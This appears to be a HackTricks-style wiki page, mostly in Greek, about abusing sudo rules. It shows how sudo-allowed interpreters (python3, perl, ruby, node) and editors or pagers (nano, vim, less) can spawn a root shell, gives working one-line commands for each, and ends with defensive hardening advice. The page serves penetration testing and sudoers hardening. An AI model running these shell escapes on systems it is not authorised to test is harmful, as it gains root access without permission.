# Κατάχρηση εντολών Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters που επιτρέπονται από το Sudo

Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν interpreter ως root, αντιμετωπίστε το ως άμεση εκτέλεση κώδικα. Οι interpreters έχουν σχεδιαστεί για να εκτελούν αυθαίρετο κώδικα, επομένως ένας κανόνας που επιτρέπει τα `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια binaries ισοδυναμεί συνήθως με εκτέλεση εντολών ως root, εκτός αν τα arguments είναι αυστηρά περιορισμένα και επικυρωμένα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Συνηθισμένη ροή ελέγχου: πρώτα εμφανίστε τα privileges του χρήστη και, στη συνέχεια, εκτελέστε μια Python statement με την επιλογή `-c` του interpreter.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Άλλα παραδείγματα interpreters εμφανίζονται παρακάτω· οι αναφερόμενοι interpreters τεκμηριώνουν την εκτέλεση inline-code ή τα APIs child-process.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν ακριβώς τη διαδρομή κατά την επικύρωση.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors allowed by Sudo

If `sudo -l` allows a user to run an interactive editor as root, treat it as a command-execution surface, not as a harmless file-editing permission. Editors can often execute shell commands, read arbitrary files, write arbitrary files, or invoke external helpers from inside the editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Common review flow: list the user's privileges, then invoke each allowed editor or pager under sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano εκτέλεση εντολών

Όταν το `nano` επιτρέπεται μέσω sudo, η εκτέλεση εντολών μπορεί να είναι προσβάσιμη από το περιβάλλον εργασίας του editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Στη συνέχεια, δώστε μια εντολή όπως `id` ή `/bin/sh` στη γραμμή εντολών του nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Εάν ένα interactive shell δεν διαθέτει usable terminal streams, αυτή η μορφή ανακατεύθυνσης αντιστοιχίζει την τυπική έξοδο και το σφάλμα του στον descriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση του nano και τις επιλογές κατά το build, αλλά το ζήτημα ασφάλειας είναι το ίδιο: ο editor εκτελείται ως root και μπορεί να εκτελεί external commands.<sup>[[1]](#references)[[12]](#references)</sup>

### Άλλες συνηθισμένες διαφυγές από editors

Οι editors τύπου Vim συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pagers όπως το `less` μπορούν επίσης να εκθέσουν εκτέλεση shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Αμυντικές σημειώσεις

- Αποφύγετε να παρέχετε interpreters ή interactive editors μέσω sudo.<sup>[[1]](#references)</sup>
- Προτιμήστε σταθερά wrappers, ιδιοκτησίας του root, που εκτελούν μία συγκεκριμένη administrative ενέργεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το ακριβές script path και αποτρέψτε arguments ελεγχόμενα από τον χρήστη, writable imports, `PYTHONPATH` και μη ασφαλή διατήρηση του environment.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Αν απαιτείται file editing, περιορίστε το ακριβές file path και εξετάστε τη χρήση του `sudoedit` με patched εκδόσεις του sudo και αυστηρό χειρισμό του environment.<sup>[[1]](#references)[[2]](#references)</sup>
- Ελέγξτε τα `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty` και το logging, αλλά μην τα θεωρείτε πλήρες sandbox.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Τεκμηρίωση Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Τεκμηρίωση Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — πώς να εκτελέσετε τον Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Τεκμηρίωση Perl](https://perldoc.perl.org/functions/exec)
- [7] [Επιλογές γραμμής εντολών Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Τεκμηρίωση Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Τεκμηρίωση Node.js](https://nodejs.org/api/cli.html)
- [10] [Child process — Τεκμηρίωση Node.js](https://nodejs.org/api/child_process.html)
- [11] [Σελίδα εγχειριδίου lua για Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [Ο text editor GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Εγχειρίδιο αναφοράς Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
